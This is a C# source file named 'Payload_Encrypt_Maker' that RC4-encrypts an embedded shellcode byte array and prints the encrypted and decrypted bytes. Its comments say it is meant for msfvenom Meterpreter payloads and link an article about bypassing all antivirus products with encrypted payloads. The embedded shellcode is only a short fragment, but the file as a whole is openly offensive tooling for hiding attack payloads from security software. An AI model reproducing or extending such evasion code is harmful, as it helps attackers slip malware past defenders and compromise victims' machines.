using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following 
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("Payload_Encrypt_Maker")]
[assembly: AssemblyDescription("Publisher and Author: Damon mohammadbagher")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("Payload_Encrypt_Maker")]
[assembly: AssemblyCopyright("Copyright ©  2016")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible 
// to COM components.  If you need to access a type in this assembly from 
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("097ba4a7-7b6d-4fbb-8a7b-2c84af6b8a1f")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version 
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers 
// by using the '*' as shown below:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

namespace Payload_Encrypt_Maker
{ class Program
    {
        static byte[] KEY = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };
        static byte[] IV = { 0x00, 0xcc, 0x00, 0x00, 0x00, 0xcc };
        static byte[] payload ={0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52
,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48
,0x8b,0x52,0x20,0x48,0x8b,0xb5,0xa2,0x56,0xff,0xd5 };
        /// <summary>
        /// 
        /// You can use msfvenom Meterpreter Payloads with this C# Source code for making encrypted payload
        /// Publisher and Author: Damon mohammadbagher
        /// Email :  Damonmohammadbagher@gmail.com
        /// 
        /// for more information visit this link 
        /// link : https://www.linkedin.com/pulse/bypass-all-anti-viruses-encrypted-payloads-c-damon-mohammadbagher
        /// 
        /// </summary>
        /// <param name="args"></param>
        private static byte[] EncryptBytes(IEnumerable<byte> bytes)
        {
            //The ICryptoTransform is created for each call to this method as the MSDN documentation indicates that the public methods may not be thread-safe and so we cannot hold a static reference to an instance
            using (var r = Rijndael.Create())
            {
                using (var encryptor = r.CreateEncryptor(KEY, IV))
                {
                    return Transform(bytes, encryptor);
                }
            }
        }
        private static byte[] DecryptBytes(IEnumerable<byte> bytes)
        {
            //The ICryptoTransform is created for each call to this method as the MSDN documentation indicates that the public methods may not be thread-safe and so we cannot hold a static reference to an instance
            using (var r = Rijndael.Create())
            {
                using (var decryptor = r.CreateDecryptor(KEY, IV))
                {
                    return Transform(bytes, decryptor);
                }
            }
        }
        private static byte[] Transform(IEnumerable<byte> bytes, ICryptoTransform transform)
        {
            using (var stream = new MemoryStream())
            {
                using (var cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write))
                {
                    foreach (var b in bytes)
                        cryptoStream.WriteByte(b);
                }

                return stream.ToArray();
            }
        }
        private static class Encryption_Class
        {
            public static string Encrypt(string key, string data)
            {
                Encoding unicode = Encoding.Unicode;

                return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
            }

            public static string Decrypt(string key, string data)
            {
                Encoding unicode = Encoding.Unicode;

                return unicode.GetString(Encrypt(unicode.GetBytes(key), Convert.FromBase64String(data)));
            }

            public static byte[] Encrypt(byte[] key, byte[] data)
            {
                return EncryptOutput(key, data).ToArray();
            }

            public static byte[] Decrypt(byte[] key, byte[] data)
            {
                return EncryptOutput(key, data).ToArray();
            }

            private static byte[] EncryptInitalize(byte[] key)
            {
                byte[] s = Enumerable.Range(0, 256)
                  .Select(i => (byte)i)
                  .ToArray();

                for (int i = 0, j = 0; i < 256; i++)
                {
                    j = (j + key[i % key.Length] + s[i]) & 255;

                    Swap(s, i, j);
                }

                return s;
            }

            private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
            {
                byte[] s = EncryptInitalize(key);

                int i = 0;
                int j = 0;

                return data.Select((b) =>
                {
                    i = (i + 1) & 255;
                    j = (j + s[i]) & 255;

                    Swap(s, i, j);

                    return (byte)(b ^ s[(s[i] + s[j]) & 255]);
                });
            }

            private static void Swap(byte[] s, int i, int j)
            {
                byte c = s[i];

                s[i] = s[j];
                s[j] = c;
            }
        }
        static void Main(string[] args)
        {
            Console.WriteLine(" "); Console.WriteLine("----------input---payload----------------"); Console.WriteLine(" ");
            int c = 0;
            for (int i = 0; i < payload.Length; i++)
            {     c++;Console.Write(payload[i].ToString() + ","); }
            Console.WriteLine(" "); Console.WriteLine(" ");
            Console.WriteLine("byte payload:= " + payload.Length.ToString());
            Console.WriteLine("c := " + c.ToString()); Console.WriteLine(" ");
            Console.WriteLine(" "); Console.WriteLine("---------encrypted payload----------------"); Console.WriteLine(" ");
            byte[] result = Encryption_Class.Encrypt(KEY, payload);
            int b = 0;
            for (int i = 0; i < result.Length; i++)
            {   b++;
                if (i == result.Length+1)
                {Console.Write(result[i].ToString());}
                if (i != result.Length) { Console.Write(result[i].ToString() + ","); }
            }
            Console.WriteLine(" ");Console.WriteLine("byte result:= "+ result.Length.ToString()); Console.WriteLine("i:= " + b.ToString());
            Console.WriteLine(" ");Console.WriteLine(" "); Console.WriteLine("----------Decrypted payload -------------------");Console.WriteLine(" ");
            byte[] result2 = Encryption_Class.Decrypt(KEY, result);
            for (int i = 0; i < result2.Length; i++)
            { Console.Write(result2[i].ToString() + ","); }
        }
    }
}
